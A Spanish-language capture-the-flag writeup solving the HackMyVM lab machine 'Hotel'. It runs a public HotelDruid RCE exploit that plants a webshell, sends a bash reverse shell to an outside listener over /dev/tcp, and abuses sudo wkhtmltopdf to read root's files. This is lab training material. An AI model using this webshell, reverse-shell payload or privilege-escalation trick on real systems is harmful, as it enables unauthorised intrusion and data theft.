# Hotel - Writeup HackMyVm

El día de hoy veremos cómo resolver la máquina **Hotel** de la plataforma HackMyVM.  
Durante la explotación tocaremos las siguientes técnicas:

- Escaneo de puertos  
- Enumeración de directorios  
- Explotación de HotelDruid CMS (RCE)  
- Abuso de credenciales expuestas  
- Escalada de privilegios vía wkhtmltopdf  

## Enumeración

Comenzamos con un escaneo de puertos con **nmap**:

```bash
sudo nmap -p- --open -sSCV --min-rate 5000 -n -Pn 192.168.1.163
```

Resultado:

```java
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 06:1f:a2:25:19:45:2b:2f:44:cc:74:7a:e2:9b:ab:ac (RSA)
|   256 6f:b9:da:fb:eb:6b:4c:de:33:63:b7:ce:f0:2f:f7:cd (ECDSA)
|_  256 84:fb:1d:5c:4c:c6:60:e8:47:d8:2f:a0:92:8e:fb:18 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title:  Hoteldruid 
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:9D:0F:F0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el puerto 80 encontramos lo siguiente:  
![alt text](img/hotel001.png)

## Intrusión

Investigando un poco en internet descubrimos que se trata de un CMS para hoteles llamado **HotelDruid**.  
Usamos **searchsploit** para ver si existía algún exploit público:

```bash
searchsploit Hotel Druid
```
```bash
Hotel Druid 3.0.3 - Remote Code Execution (RCE)
HotelDruid 2.2.4 - 'anno' SQL Injection                                
HotelDruid 2.3 - Cross-Site Scripting 
HotelDruid 2.3.0 - 'id_utente_mod' SQL Injection
```

Nos llama la atención el **RCE**, así que lo descargamos y ejecutamos:

```bash
python3 50754.py -t http://192.168.1.163/ --noauth
```
```bash
/home/alejandro/Escritorio/Maquinas/hotel/nmap/50754.py:75: SyntaxWarning: invalid escape sequence '\ '
  | $$  | $$  /$$$$$$  /$$$$$$    /$$$$$$ | $$      | $$  \ $$  /$$$$$$  /$$   /$$ /$$  /$$$$$$$

 /$$   /$$             /$$               /$$       /$$$$$$$                      /$$       /$$
| $$  | $$            | $$              | $$      | $$__  $$                    |__/      | $$
| $$  | $$  /$$$$$$  /$$$$$$    /$$$$$$ | $$      | $$  \ $$  /$$$$$$  /$$   /$$ /$$  /$$$$$$$
| $$$$$$$$ /$$__  $$|_  $$_/   /$$__  $$| $$      | $$  | $$ /$$__  $$| $$  | $$| $$ /$$__  $$
| $$__  $$| $$  \ $$  | $$    | $$$$$$$$| $$      | $$  | $$| $$  \__/| $$  | $$| $$| $$  | $$
| $$  | $$| $$  | $$  | $$ /$$| $$_____/| $$      | $$  | $$| $$      | $$  | $$| $$| $$  | $$
| $$  | $$|  $$$$$$/  |  $$$$/|  $$$$$$$| $$      | $$$$$$$/| $$      |  $$$$$$/| $$|  $$$$$$$
|__/  |__/ \______/    \___/   \_______/|__/      |_______/ |__/       \______/ |__/ \_______/

Exploit By - 0z09e (https://twitter.com/0z09e)


[*] Trying to access the Dashboard.
[*] Checking the privilege of the user.
[+] User has the privilege to add room.
[*] Adding a new room.
[+] Room has been added successfully.
[*] Testing code exection
[+] Code executed successfully, Go to http://192.168.1.163/dati/selectappartamenti.php and execute the code with the parameter 'cmd'.
[+] Example : http://192.168.1.163/dati/selectappartamenti.php?cmd=id
[+] Example Output : uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El exploit nos indica que subió una webshell a **/dati/selectappartamenti.php** con el parámetro `cmd`.  
Nos ponemos en escucha con netcat y enviamos una reverse shell:

```bash
nc -lvnp 9001
```
```bash
http://192.168.1.163/dati/selectappartamenti.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.152/9001%200%3E%261%22
```

## Escalada de privilegios

En el directorio **/var/www/html** encontramos un archivo interesante llamado `ttylog`, el cual descargamos para analizarlo en nuestra máquina.  
Con la herramienta **ttyplay** lo ejecutamos y conseguimos la contraseña del usuario **person**:  
![alt text](img/hotel002.png)

Vemos que `person` puede ejecutar la herramienta **wkhtmltopdf** como root:

```bash
person@hotel:~$ sudo -l
Matching Defaults entries for person on hotel:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User person may run the following commands on hotel:
    (root) NOPASSWD: /usr/bin/wkhtmltopdf
```

Investigando esta herramienta vemos que podemos extraer un archivo del usuario root y exportarlo a PDF para visualizarlo:

```bash
sudo wkhtmltopdf /root/root.txt root.pdf
```

Transferimos el archivo PDF a nuestra máquina:  

En la máquina víctima:

```bash
python3 -m http.server 5000
```

En la máquina atacante:

```bash
wget 192.168.1.163:5000/root.pdf
```

Al abrirlo, vemos que contiene la flag de **/root/root.txt**:  
![alt text](img/hotel003.png)

¡Ya tenemos la flag de root! 🎉